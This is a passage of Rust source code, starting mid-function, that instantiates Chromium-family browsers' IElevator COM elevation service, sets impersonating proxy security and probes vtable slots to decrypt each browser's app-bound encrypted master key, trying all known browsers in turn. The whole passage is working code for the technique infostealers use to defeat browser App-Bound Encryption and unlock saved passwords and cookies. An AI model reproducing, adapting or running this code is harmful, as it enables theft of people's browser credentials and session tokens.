    if p.is_null() { return Vec::new(); }
    let len = SysStringByteLen(p) as usize;
    let bytes = std::slice::from_raw_parts(p as *const u8, len).to_vec();
    SysFreeString(p);
    bytes
}

const COINIT_APARTMENTTHREADED: u32 = 0x2;
const CLSCTX_LOCAL_SERVER: u32 = 0x4;
const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;

pub fn decrypt_app_bound_key(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let hr = CoInitializeEx(std::ptr::null(), COINIT_APARTMENTTHREADED);
        if hr < 0 && hr != 0x0000_0001u32 as i32 {
            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
        }
        let result = try_all_browsers(encrypted_key);
        CoUninitialize();
        result
    }
}

pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let hr = CoInitializeEx(std::ptr::null(), COINIT_APARTMENTTHREADED);
        if hr < 0 && hr != 0x0000_0001u32 as i32 {
            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
        }
        let r = try_browser(browser, encrypted_key);
        CoUninitialize();
        r
    }
}

unsafe fn try_all_browsers(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    let mut last = String::from("no browser tried");
    for b in all_browsers() {
        match try_browser(b, encrypted_key) {
            Ok(key) => return Ok(key),
            Err(e) => last = format!("{}: {e}", b.name),
        }
    }
    match try_browser(generic_chromium_ref(), encrypted_key) {
        Ok(key) => return Ok(key),
        Err(e) => last = format!("{}: {e}", s_chromium()),
    }
    Err(format!("all browsers failed; last: {last}"))
}

unsafe fn try_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    let mut last = String::from("no IID tried");
    let mut saw_no_interface = false;
    let mut saw_class_not_reg = false;

    for &iid in browser.iids {
        match try_one(encrypted_key, &browser.clsid, &iid) {
            Ok(key) => {
                return Ok(key);
            }
            Err(e) => {
                if e.contains("0x80004002") { saw_no_interface = true; }
                if e.contains("0x80040154") || e.contains("0x80040111") { saw_class_not_reg = true; }
                last = e;
            }
        }
    }

    let hint = if saw_class_not_reg {
        format!(
            "Elevation service not registered ({}). Reinstall {} or repair the elevation service.",
            browser.service_name, browser.name
        )
    } else if saw_no_interface {
        format!(
            "No IElevator interface matched ({}). Ensure {} is up to date.",
            browser.service_name, browser.name
        )
    } else {
        String::new()
    };

    if hint.is_empty() {
        Err(format!("{} failed; last: {last}", browser.name))
    } else {
        Err(format!("{} failed; last: {last}. {hint}", browser.name))
    }
}

unsafe fn call_decrypt_at_slot(
    punk: *mut c_void,
    enc: &[u8],
    slot: usize,
) -> Result<Vec<u8>, String> {
    let vtbl = *(punk as *const *const *const c_void);
    let dec_fn_ptr = *vtbl.add(slot);
    if dec_fn_ptr.is_null() {
        return Err(format!("null DecryptData at slot {slot}"));
    }
    let dec: FnDec = std::mem::transmute(dec_fn_ptr);

    let cipher = OwnedBstr::from_bytes(enc).ok_or("SysAllocStringByteLen null")?;
    let mut plain: *mut u16 = std::ptr::null_mut();
    let mut last_err: u32 = 0;

    let hr_d = dec(punk, cipher.ptr(), &mut plain, &mut last_err);
    if hr_d < 0 {
        return Err(format!("DecryptData slot {slot} 0x{hr_d:08X} last_error={last_err}"));
    }
    let bytes = consume_bstr(plain);
    if bytes.is_empty() {
        return Err(format!("empty key at slot {slot}"));
    }
    Ok(bytes)
}

fn normalize_com_key(bytes: &[u8]) -> Option<Vec<u8>> {
    if bytes.len() == 32 { return Some(bytes.to_vec()); }
    if bytes.len() > 32 {
        let tail = &bytes[bytes.len() - 32..];
        if tail.iter().any(|&b| b != 0) {
            return Some(tail.to_vec());
        }
    }
    None
}

unsafe fn try_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, String> {
    let mut punk: *mut c_void = std::ptr::null_mut();
    let hr = CoCreateInstance(clsid, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid, &mut punk);
    if hr < 0 {
        return Err(format!("CoCreateInstance 0x{hr:08X}"));
    }
    if punk.is_null() {
        return Err("null COM pointer".into());
    }

    let hr_pb = CoSetProxyBlanket(
        punk,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        std::ptr::null(),
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        std::ptr::null(),
        EOAC_DYNAMIC_CLOAKING,
    );
    if hr_pb < 0 {
        let _ = hr_pb;
    }

    let elev = punk as *mut IElev;
    let release = || ((*(*elev).vtbl).rel)(punk);

    let mut last = String::from("no slot worked");
    for slot in [5usize, 8, 6, 7] {
        match call_decrypt_at_slot(punk, enc, slot) {
            Ok(bytes) => {
                if let Some(key) = normalize_com_key(&bytes) {
                    release();
                    return Ok(key);
                }
                last = format!("slot {slot}: unexpected length {}", bytes.len());
            }
            Err(e) => last = e,
        }
    }

    release();
    Err(format!("DecryptData failed; last: {last}"))
}
